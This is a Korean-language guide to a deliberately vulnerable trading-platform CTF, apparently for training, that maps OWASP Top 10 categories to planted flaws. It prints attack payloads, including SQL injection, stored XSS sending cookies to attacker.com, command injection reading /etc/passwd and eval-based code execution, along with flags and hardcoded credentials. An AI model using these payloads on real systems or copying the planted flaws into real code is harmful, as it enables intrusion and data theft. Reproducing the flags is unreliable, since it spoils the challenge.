# 🔓 OWASP Top 10 2025 취약점 가이드

이 문서는 KIS Trading CTF Platform에 구현된 OWASP Top 10 2025 취약점에 대한 상세 설명입니다.

---

## 📋 목차

1. [A01:2025 - Broken Access Control](#a012025---broken-access-control)
2. [A02:2025 - Security Misconfiguration](#a022025---security-misconfiguration)  
3. [A03:2025 - Software Supply Chain](#a032025---software-supply-chain)
4. [A04:2025 - Cryptographic Failures](#a042025---cryptographic-failures)
5. [A05:2025 - Injection](#a052025---injection)
6. [A06:2025 - Insecure Design](#a062025---insecure-design)
7. [A07:2025 - Authentication Failures](#a072025---authentication-failures)
8. [A08:2025 - Integrity Failures](#a082025---integrity-failures)
9. [A09:2025 - Logging Failures](#a092025---logging-failures)
10. [A10:2025 - Exception Handling](#a102025---exception-handling)

---

## A01:2025 - Broken Access Control

### 설명
접근 제어가 올바르게 구현되지 않아 권한 없는 사용자가 다른 사용자의 데이터에 접근하거나 관리자 기능을 사용할 수 있습니다.

### 취약점 위치

#### 1. IDOR (Insecure Direct Object Reference)
**파일:** `backend/src/routes/trading.js`

```javascript
// 다른 사용자의 주문 조회 가능
router.get('/orders/:orderId', authenticateToken, async (req, res) => {
  const { orderId } = req.params;
  // ❌ 사용자 소유권 확인 없음
  const [rows] = await db.query('SELECT * FROM orders WHERE id = ?', [orderId]);
});
```

**공격 방법:**
```bash
# 다른 사용자의 주문 조회
curl http://localhost:5000/api/trading/orders/1 -H "Authorization: Bearer <your_token>"
```

#### 2. 관리자 헤더 우회
**파일:** `backend/src/routes/admin.js`

```javascript
// 클라이언트 측 헤더만으로 관리자 확인
const isAdmin = req.headers['x-is-admin'] === 'true';
```

**공격 방법:**
```bash
curl http://localhost:5000/api/admin/users \
  -H "Authorization: Bearer <user_token>" \
  -H "X-Is-Admin: true"
```

#### 3. Path Traversal
**파일:** `backend/src/routes/file.js`

```javascript
// 경로 검증 없이 파일 접근
router.get('/download', async (req, res) => {
  const { filename } = req.query;
  const filePath = path.join(__dirname, '../../uploads', filename);
  // ❌ path traversal 방지 없음
});
```

**공격 방법:**
```bash
curl "http://localhost:5000/api/file/download?filename=../../../etc/passwd"
```

### 🚩 플래그
- `FLAG{1D0R_4cc3ss_C0ntr0l_Byp4ss}` - IDOR 취약점
- `FLAG{4dm1n_4cc3ss_W1th0ut_4uth}` - 관리자 우회
- `FLAG{P4th_Tr4v3rs4l_LF1_Succ3ss}` - Path Traversal

---

## A02:2025 - Security Misconfiguration

### 설명
보안 설정이 올바르지 않거나 기본값으로 남아있어 공격에 취약합니다.

### 취약점 위치

#### 1. 과도한 CORS 설정
**파일:** `backend/src/index.js`

```javascript
app.use(cors({
  origin: '*',  // ❌ 모든 출처 허용
  credentials: true
}));
```

#### 2. 디버그 모드 활성화
**파일:** `backend/src/index.js`

```javascript
app.set('env', 'development');
```

#### 3. 민감한 환경변수 노출
**파일:** `backend/src/routes/admin.js`

```javascript
router.get('/env', async (req, res) => {
  res.json({
    env: process.env,  // ❌ 모든 환경변수 노출
    nodeVersion: process.version
  });
});
```

#### 4. 하드코딩된 비밀키
**파일:** `backend/src/config/database.js`

```javascript
module.exports = {
  host: 'database',
  user: 'root',
  password: 'rootpassword123!',  // ❌ 하드코딩
  database: 'kis_trading'
};
```

---

## A03:2025 - Software Supply Chain

### 설명
취약한 버전의 라이브러리를 사용하여 알려진 취약점에 노출됩니다.

### 취약점 위치

**파일:** `backend/package.json`

```json
{
  "dependencies": {
    "lodash": "4.17.20",           // CVE-2021-23337 (Prototype Pollution)
    "serialize-javascript": "3.1.0" // CVE-2020-7660 (RCE)
  }
}
```

**공격 방법:**
```javascript
// Lodash Prototype Pollution
const _ = require('lodash');
_.setWith({}, '__proto__.isAdmin', true, Object);
console.log({}.isAdmin); // true
```

---

## A04:2025 - Cryptographic Failures

### 설명
암호화가 제대로 구현되지 않아 민감한 데이터가 노출됩니다.

### 취약점 위치

#### 1. 약한 bcrypt 해시
**파일:** `backend/src/routes/auth.js`

```javascript
const hashedPassword = await bcrypt.hash(password, 4);  // ❌ salt rounds 4 (최소 12 권장)
```

#### 2. JWT에 민감한 정보 포함
**파일:** `backend/src/routes/auth.js`

```javascript
const token = jwt.sign({
  id: user.id,
  email: user.email,
  password_hash: user.password_hash,  // ❌ 해시된 비밀번호 포함
  role: user.role
}, JWT_SECRET);
```

#### 3. 약한 JWT 비밀키
**파일:** `backend/src/routes/auth.js`

```javascript
const JWT_SECRET = 'super_secret_key_12345';  // ❌ 예측 가능한 비밀키
```

### 🚩 플래그
- `FLAG{W34k_Crypt0_1s_N0_Crypt0}` - JWT 분석

---

## A05:2025 - Injection

### 설명
사용자 입력이 적절히 검증되지 않아 SQL, XSS, Command Injection이 가능합니다.

### 취약점 위치

#### 1. SQL Injection
**파일:** `backend/src/routes/auth.js`

```javascript
router.post('/login', async (req, res) => {
  const { email, password } = req.body;
  // ❌ 문자열 연결로 쿼리 생성
  const query = `SELECT * FROM users WHERE email = '${email}'`;
});
```

**공격 방법:**
```bash
# 인증 우회
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@kis-trading.com'\'' OR 1=1--", "password": "anything"}'

# UNION 기반 데이터 추출
curl "http://localhost:5000/api/market/search?keyword=' UNION SELECT 1,flag,3,4,5 FROM flags--"
```

#### 2. Stored XSS
**파일:** `backend/src/routes/board.js`

```javascript
router.post('/posts', authenticateToken, async (req, res) => {
  const { title, content } = req.body;
  // ❌ HTML 이스케이프 없이 저장
  await db.query('INSERT INTO posts (title, content) VALUES (?, ?)', [title, content]);
});
```

**공격 방법:**
```html
<!-- 게시글 제목 또는 내용에 입력 -->
<script>document.location='http://attacker.com?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">
```

#### 3. Command Injection
**파일:** `backend/src/routes/file.js`

```javascript
router.post('/process', async (req, res) => {
  const { filename } = req.body;
  // ❌ 사용자 입력을 직접 명령어에 삽입
  exec(`convert uploads/${filename} -resize 100x100 thumbnails/${filename}`, callback);
});
```

**공격 방법:**
```bash
curl -X POST http://localhost:5000/api/file/process \
  -d '{"filename": "test.jpg; cat /etc/passwd"}'
```

### 🚩 플래그
- `FLAG{SQL_1nj3ct10n_M4st3r_2025}` - SQL Injection
- `FLAG{St0r3d_XSS_4tt4ck_Succ3ss}` - Stored XSS
- `FLAG{C0mm4nd_1nj3ct10n_RCE}` - Command Injection

---

## A06:2025 - Insecure Design

### 설명
설계 단계에서 보안이 고려되지 않아 근본적인 취약점이 존재합니다.

### 취약점 위치

#### 1. Rate Limiting 없음
**파일:** `backend/src/routes/auth.js`

```javascript
// ❌ 로그인 시도 제한 없음 - 브루트포스 공격 가능
router.post('/login', async (req, res) => {
  // 무제한 시도 가능
});
```

#### 2. CSRF 보호 없음
**파일:** `backend/src/routes/kisOAuth.js`

```javascript
// ❌ state 파라미터 검증 없음
router.get('/callback', async (req, res) => {
  const { code, state } = req.query;
  // state 검증 없이 진행
});
```

#### 3. 파일 업로드 검증 없음
**파일:** `backend/src/routes/file.js`

```javascript
// ❌ 파일 확장자/타입 검증 없음
const storage = multer.diskStorage({
  filename: (req, file, cb) => {
    cb(null, file.originalname);  // 원본 파일명 그대로 사용
  }
});
```

### 🚩 플래그
- `FLAG{D4ng3r0us_F1l3_Upl04d}` - 악성 파일 업로드

---

## A07:2025 - Authentication Failures

### 설명
인증 메커니즘이 취약하여 공격자가 인증을 우회하거나 세션을 탈취할 수 있습니다.

### 취약점 위치

#### 1. 사용자 열거
**파일:** `backend/src/routes/auth.js`

```javascript
// 이메일 존재 여부 확인 가능
if (!user) {
  return res.status(401).json({ error: 'Email not found' });  // ❌ 사용자 존재 여부 노출
}
if (!validPassword) {
  return res.status(401).json({ error: 'Incorrect password' });  // ❌ 비밀번호 오류 노출
}
```

#### 2. 예측 가능한 비밀번호 재설정 토큰
**파일:** `backend/src/routes/auth.js`

```javascript
const resetToken = Date.now().toString(36);  // ❌ 타임스탬프 기반
```

#### 3. 긴 JWT 만료 시간
**파일:** `backend/src/routes/auth.js`

```javascript
jwt.sign(payload, JWT_SECRET, { expiresIn: '365d' });  // ❌ 1년 유효
```

---

## A08:2025 - Integrity Failures

### 설명
소프트웨어 또는 데이터의 무결성 검증이 없어 변조 공격이 가능합니다.

### 취약점 위치

#### 1. 안전하지 않은 역직렬화
**파일:** `backend/src/routes/admin.js`

```javascript
router.post('/settings', async (req, res) => {
  const { config } = req.body;
  // ❌ eval()로 역직렬화 - RCE 가능
  const settings = eval('(' + config + ')');
});
```

**공격 방법:**
```bash
curl -X POST http://localhost:5000/api/admin/settings \
  -H "X-Is-Admin: true" \
  -d '{"config": "require(\"child_process\").execSync(\"id\")"}'
```

#### 2. CSRF 토큰 없음
모든 상태 변경 요청에 CSRF 토큰이 없습니다.

---

## A09:2025 - Logging Failures

### 설명
로깅이 불충분하거나 민감한 정보를 로깅하여 보안 문제가 발생합니다.

### 취약점 위치

#### 1. 민감한 정보 로깅
**파일:** `backend/src/routes/trading.js`

```javascript
console.log('Order request:', JSON.stringify(req.body));  // ❌ 비밀번호/토큰 로깅 가능
console.log('User token:', req.headers.authorization);    // ❌ 인증 토큰 로깅
```

#### 2. 불충분한 감사 로깅
보안 관련 이벤트가 기록되지 않습니다.

### 🚩 플래그
- `FLAG{T0k3n_L34k_1n_R3sp0ns3}` - API 응답/로그에서 토큰 발견

---

## A10:2025 - Exception Handling

### 설명
예외 처리가 적절하지 않아 민감한 시스템 정보가 노출됩니다.

### 취약점 위치

**파일:** `backend/src/middleware/errorHandler.js`

```javascript
const errorHandler = (err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,           // ❌ 스택 트레이스 노출
    sql: err.sql,               // ❌ SQL 쿼리 노출
    request: {
      body: req.body,           // ❌ 요청 본문 노출
      headers: req.headers      // ❌ 헤더 노출
    }
  });
};
```

---

## 🛡️ 보안 권장사항

각 취약점에 대한 수정 방법:

| 취약점 | 권장 수정사항 |
|--------|--------------|
| SQL Injection | Prepared Statement 사용 |
| XSS | 출력 인코딩, CSP 헤더 |
| IDOR | 리소스 소유권 확인 |
| Command Injection | 입력 검증, execFile 사용 |
| Path Traversal | 경로 정규화 및 화이트리스트 |
| Weak JWT | 강력한 비밀키, 짧은 만료시간 |
| CORS | 특정 출처만 허용 |
| Rate Limiting | express-rate-limit 사용 |
| File Upload | 확장자 및 MIME 타입 검증 |
| Error Handling | 일반적인 오류 메시지만 반환 |

---

## 📚 참고 자료

- [OWASP Top 10 2025](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [PentesterLab](https://pentesterlab.com/)
